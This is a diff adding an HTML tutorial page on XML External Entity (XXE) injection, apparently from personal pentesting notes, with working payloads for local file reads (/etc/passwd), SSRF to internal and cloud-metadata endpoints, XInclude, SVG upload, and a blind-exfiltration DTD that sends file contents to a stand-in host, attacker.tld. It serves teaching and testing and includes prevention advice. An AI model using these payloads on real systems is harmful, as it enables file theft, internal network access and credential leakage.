@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>XML External Entity (XXE)</title>
+  <link rel="stylesheet" href="https://myfirstorlastname.github.io/whoami/style.css" />
+</head>
+<body>
+  <div id="toc-container"></div>
+
+  <h1>📂 XML External Entity (XXE)</h1>
+  <blockquote>Web is the front door to the internet. Know how to open it… or break it.</blockquote>
+  <hr>
+
+  <h2>🧠 About</h2>
+  <p>
+    XML External Entity (XXE) injection is a class of vulnerabilities that arises when an XML parser processes untrusted input and allows external entities to be resolved. 
+    XXE can enable file disclosure, internal network access (SSRF), credential leakage, and sometimes remote code execution depending on the environment.
+    This page summarizes practical XXE testing and exploitation patterns, with examples inspired by PortSwigger-style labs.
+  </p>
+
+  <h2>📚 What is XML?</h2>
+  <p>
+    eXtensible Markup Language (XML) is a structured data format used by APIs, legacy SOAP services, SAML assertions, configuration files, and document imports.
+    XML documents can define <em>entities</em>—placeholders that the parser replaces with values. When external entities are allowed, an attacker can point them to local files or network resources.
+  </p>
+
+  <h2>🔍 How XXE Happens</h2>
+  <p>
+    XXE occurs when the application parses attacker-controlled XML and the XML parser:
+  </p>
+  <ul>
+    <li>Has external entity resolution enabled (default in many legacy libraries)</li>
+    <li>Accepts user-supplied XML (body, file upload, import feature)</li>
+    <li>Does not validate or sanitize the XML content</li>
+  </ul>
+  <p>Typical vulnerable flow:</p>
+  <pre><code>
+POST /api/import
+Content-Type: application/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+  </code></pre>
+  <p>
+    If the parser expands <code>&amp;xxe;</code>, the server may include the contents of <code>/etc/passwd</code> in its response—or send it somewhere else (blind exfiltration).
+  </p>
+
+  <h2>🧨 Types of XXE & Related Vectors</h2>
+  <table>
+    <thead>
+      <tr><th>Type</th><th>Description</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Classic XXE (in-band)</strong></td>
+        <td>External entity reads a local file and the server returns it in the HTTP response.</td>
+      </tr>
+      <tr>
+        <td><strong>Blind XXE (out-of-band)</strong></td>
+        <td>No direct response. Use external DTDs or callbacks (DNS/HTTP) to exfiltrate data.</td>
+      </tr>
+      <tr>
+        <td><strong>XXE → SSRF</strong></td>
+        <td>External entity points to internal services (e.g., <code>http://169.254.169.254/</code> or intranet hosts) to pivot internally.</td>
+      </tr>
+      <tr>
+        <td><strong>XInclude</strong></td>
+        <td>Abuse <code>&lt;xi:include&gt;</code> to pull local files even when external entities are disabled.</td>
+      </tr>
+      <tr>
+        <td><strong>XXE via file upload</strong></td>
+        <td>Crafted XML within uploaded files (e.g., SVG) is parsed server-side and triggers entity resolution.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="takeaway-box">
+    <h3>🧠 Key Takeaways</h3>
+    <ul>
+      <li>XXE is about <strong>parser behavior</strong>: if external resolution is on, the XML can “reach out”.</li>
+      <li>Impact ranges from file read to SSRF and blind exfiltration.</li>
+      <li>Even if XXE is patched, <strong>XInclude</strong> and parser quirks might still be exploitable.</li>
+    </ul>
+  </div>
+
+  <div class="tips-box">
+    <h3>🔧 Testing Tips</h3>
+    <ul>
+      <li>Send simple entity tests first; if no reflection, try blind callbacks (DNS/HTTP).</li>
+      <li>Try different content types: <code>application/xml</code>, <code>text/xml</code>, and file uploads (SVG).</li>
+      <li>Inspect error messages: parser errors often leak file paths or entity info.</li>
+      <li>For blind cases, use an external endpoint you control (or a collaborator server) to confirm interaction.</li>
+    </ul>
+  </div>
+
+  <h2>🧪 Practical Examples</h2>
+
+  <h3>1) Classic file read (in-band)</h3>
+  <pre><code>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;profile&gt;&amp;xxe;&lt;/profile&gt;
+  </code></pre>
+  <p>
+    If the application echoes the parsed XML content, the response may contain <code>/etc/passwd</code>. On Windows, try <code>file:///c:/windows/win.ini</code>.
+  </p>
+
+  <h3>2) SSRF via XXE</h3>
+  <pre><code>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"&gt; ]&gt;
+&lt;fetch&gt;&amp;xxe;&lt;/fetch&gt;
+  </code></pre>
+  <p>
+    The parser makes a server-side request to an internal endpoint—useful for probing intranet services or metadata endpoints.
+  </p>
+
+  <h3>3) Blind exfiltration with external DTD</h3>
+  <p>Host a malicious DTD on a server you control:</p>
+  <pre><code>
+# evil.dtd
+&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY exfil SYSTEM 'http://attacker.tld/log?d=%file;'&gt;"&gt;
+%eval;
+  </code></pre>
+  <p>Victim XML:</p>
+  <pre><code>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % ext SYSTEM "http://attacker.tld/evil.dtd"&gt; %ext; ]&gt;
+&lt;data&gt;&amp;exfil;&lt;/data&gt;
+  </code></pre>
+  <p>
+    The parser fetches the DTD, reads the local file, and exfiltrates it to your server (no data in the HTTP response required).
+  </p>
+
+  <h3>4) XInclude to retrieve files</h3>
+  <pre><code>
+&lt;?xml version="1.0"?>
+&lt;root xmlns:xi="http://www.w3.org/2001/XInclude">
+  &lt;xi:include href="file:///etc/passwd" parse="text" />
+&lt;/root>
+  </code></pre>
+  <p>
+    If the app supports XInclude, this can include local files even when XML external entities are disabled.
+  </p>
+
+  <h3>5) XXE via image (SVG) upload</h3>
+  <pre><code>
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
+  &lt;text x="10" y="20"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+  </code></pre>
+  <p>
+    If the backend parses the SVG (e.g., for resizing or validation), the entity may resolve server-side.
+  </p>
+
+  <h2>🧬 XXE in Real-World Attack Chains</h2>
+  <p>
+    In professional testing, XXE is rarely the end goal—it’s a <strong>pivot</strong>:
+  </p>
+  <ul>
+    <li><strong>File read → credentials → lateral movement</strong> (DB connection strings, API tokens, SSH keys)</li>
+    <li><strong>XXE → SSRF</strong> to hit internal admin panels, cloud metadata (<code>169.254.169.254</code>) or service discovery endpoints</li>
+    <li><strong>Blind XXE</strong> to extract secrets via controlled callbacks even when responses are sanitized</li>
+    <li>Combine with <strong>file upload</strong> or <strong>weak parsing</strong> to escalate to RCE (environment-specific)</li>
+  </ul>
+
+  <div class="takeaway-box">
+    <h3>🛠️ Key Mindset</h3>
+    <ul>
+      <li>Think “what can the parser reach?”—files, loopback services, intranet, cloud metadata.</li>
+      <li>If you can’t see output, try blind exfiltration via an external DTD or collaborator domain.</li>
+      <li>When XXE is blocked, test for XInclude and parser-specific quirks.</li>
+    </ul>
+  </div>
+
+  <h2>🔒 Prevention & Hardening</h2>
+  <ul>
+    <li><strong>Disable external entity resolution</strong> in XML parsers (secure defaults/framework settings).</li>
+    <li><strong>Use a safe XML library</strong> (hardened configurations; avoid legacy defaults).</li>
+    <li><strong>Validate input</strong> and avoid parsing XML from untrusted sources when possible.</li>
+    <li><strong>Restrict egress</strong> from application servers to limit SSRF/DTD callouts.</li>
+    <li><strong>Treat uploads defensively</strong>: verify type, parse only when necessary, use isolated services.</li>
+  </ul>
+
+  <h2>🧰 Tools & Workflow</h2>
+  <ul>
+    <li><strong>Burp Suite</strong> Repeater/Intruder for crafting XML payloads and observing behavior</li>
+    <li><strong>Collaborator</strong> (or any callback endpoint) for blind XXE detection</li>
+    <li>Logging/monitoring on the target (when allowed) to spot parser requests or errors</li>
+  </ul>
+
+  <hr />
+
+  <footer>
+    Web hacking is a discipline of logic, curiosity, and precision. Learn how the web works, then learn how to make it work for you.
+  </footer>
+  <script src="https://myfirstorlastname.github.io/whoami/call_for_toc.js"></script>
+</body>
+</html>
